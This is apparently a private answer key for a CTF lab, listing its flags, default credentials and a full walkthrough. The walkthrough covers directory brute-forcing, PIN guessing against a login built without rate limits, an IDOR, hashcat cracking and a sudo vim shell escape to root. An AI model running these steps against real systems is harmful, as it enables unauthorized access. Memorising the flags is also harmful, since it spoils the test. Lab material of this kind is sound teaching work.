# Private answer key — ARASAKA SUBNET

> **Do not distribute to participants.** This file contains the solution and default lab
> values. Use it only to verify an authorized CTF instance.

## Default credentials and flags

| Item | Default value |
| --- | --- |
| Local URL | `http://localhost:3000` |
| Operator account | `alt.cunningham@arasaka.int` |
| Operator PIN | `5182` |
| SSH account | `operator` |
| SSH password / Flag 03 | `$4mura1` / `FLAG{$4mura1}` |
| Local SSH | `localhost:2222` |
| Sudo-enabled editor | `/usr/bin/vim` |

| # | Flag | Where to verify |
| --- | --- | --- |
| 1 | `FLAG{5182}` | Successful operator login |
| 2 | `FLAG{238585b35ca04135db65d5855477dc2ec57d037697e23118d8c4eed448e8ebb4}` | SHA-256 seal in private record ID 6 |
| 3 | `FLAG{$4mura1}` | Result of cracking Flag 02; same value is the SSH password |
| 4 | `FLAG{cunningham_signal_recovered}` | `/home/operator/user.txt` over SSH |
| 5 | `FLAG{black_wall_root_backup}` | `/root/root.txt` in the SSH container |

The default Flag 02 is the SHA-256 digest of `SSH_PASSWORD`, which defaults to `$4mura1`.
If that environment value is
customized, the seed generates a matching hash in the private dispatch; the recovered
password is Flag 03 and logs into SSH as `operator`.

## Intended walkthrough

1. **Enumerate frontend routes.** From Kali, set `TARGET` to the challenge host. If
   RockYou is compressed, extract it, then scan the web root. `/password` is an alias for
   the operator login screen and matches the common `password` entry in RockYou; `/login`,
   `/notes`, and `/profile` are also valid frontend paths.

   ```sh
   TARGET=192.168.1.25
   if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
     sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
   fi
   gobuster dir -u "http://$TARGET:3000/" -w /usr/share/wordlists/rockyou.txt -s 200,204,301,302,307,401,403 -t 50
   ```

2. **Brute-force the operator PIN.** The public account directory identifies
   `alt.cunningham@arasaka.int`; `Shift protocol` confirms the PIN is four numeric digits.
   Submit four-digit candidates to `POST /api/auth/login` on this authorized lab instance.
   There is intentionally no rate limit. A successful login returns the access token and
   `FLAG{<PIN>}`. The default PIN is `5182`; the public notes do not contain a PIN hash.
   For a manual request check, replace `PIN_CANDIDATE` with one candidate:

   ```sh
   curl -i -X POST "http://$TARGET:3000/api/auth/login" \
     -H 'Content-Type: application/json' \
     -d '{"email":"alt.cunningham@arasaka.int","password":"PIN_CANDIDATE"}'
   ```

   Keep PIN testing within the designated challenge instance. This answer key does not
   provide a bulk-attempt script.

3. **Enumerate record IDs and exploit the IDOR.** With the operator token, request IDs from
   `GET /api/notes/:id`. Public records occupy IDs 1–5. Private records 6–8 are owned by the
   Directorate but returned without an ownership check:
   - ID 6 is Alt's restricted Board dispatch. Its SHA-256 maintenance credential seal is
     Flag 02.
   - ID 7 is an intercepted logistics email confirming Alt's destination at Anel Baixo.
   - ID 8 is a shift handoff email confirming `operator` is the SSH username (a local
     service account, not Alt's email), the target is the challenge host IP, and the relay
     listens on port `2222`. It also points back to the sealed credential in ID 6.

   For example, request the records with the same bearer token returned at login:

   ```sh
   TOKEN='paste_access_token_here'
   curl -s -H "Authorization: Bearer $TOKEN" "http://$TARGET:3000/api/notes/6"
   curl -s -H "Authorization: Bearer $TOKEN" "http://$TARGET:3000/api/notes/7"
   curl -s -H "Authorization: Bearer $TOKEN" "http://$TARGET:3000/api/notes/8"
   ```

4. **Crack Flag 02 to recover Flag 03.** Extract the hexadecimal digest inside `FLAG{...}`
   from record 6 and save only the digest in `ssh.hash`. The lore clue points to the base
   word `samurai`; the supplied rule applies the positional substitutions that produce the
   recovered passphrase. Use Hashcat's raw SHA-256 mode with Kali's `rockyou.txt`:

   ```sh
   curl -s -H "Authorization: Bearer $TOKEN" "http://$TARGET:3000/api/notes/6" \
     | jq -r '.content' \
     | sed -n 's/.*FLAG{\([0-9a-f]\{64\}\)}.*/\1/p' > ssh.hash
   if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
     sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
   fi
   hashcat -m 1400 -r wordlists/arasaka.rule ssh.hash /usr/share/wordlists/rockyou.txt
   hashcat --show -m 1400 ssh.hash
   ```

   The rule changes `samurai` to `$4mura1`. Record it as `FLAG{$4mura1}` and use the recovered
   plaintext as the SSH password. Run the attack only against the challenge data.

5. **Retrieve Flag 04.** Connect to the challenge SSH service on port `2222` as `operator`
   using the recovered password. `operator` is the SSH username; replace `TARGET` with the
   challenge host's IP (do not use Alt's email as the SSH user). Read
   `/home/operator/user.txt`.

   ```sh
   ssh -p 2222 operator@"$TARGET"
   ```

   In the SSH session:

   ```sh
   cat /home/operator/user.txt
   ```

6. **Retrieve Flag 05.** In the disposable SSH container, `sudo -l` reveals that `operator`
   can run `/usr/bin/vim` as root without a password. Use that permission to read
   `/root/root.txt`. This escalation is limited to the challenge container and does not
   grant access to the Docker host.

   ```sh
   sudo -l
   sudo /usr/bin/vim -c ':!/bin/sh'
   cat /root/root.txt
   ```

## Quick verification

- Exactly five distinct flags are produced in `FLAG{...}` format.
- `/password` is a frontend alias for operator login; the public notes contain no PIN hash.
- The default successful login returns `FLAG{5182}` as Flag 01.
- `/api/notes/public` lists only records 1–5; authenticated ID requests can retrieve
  private records 6–8.
- Record 6's hash matches the SSH password configured in Compose.
- The default hash cracks to `$4mura1`, which authenticates as SSH user `operator` on port
  `2222`.
- `/home/operator/user.txt` contains Flag 04 plus the recovered transfer log; `/root/root.txt`
  contains Flag 05 plus the Directorate incident report.
- The SSH container has no host mounts, privileged mode, or Docker socket.
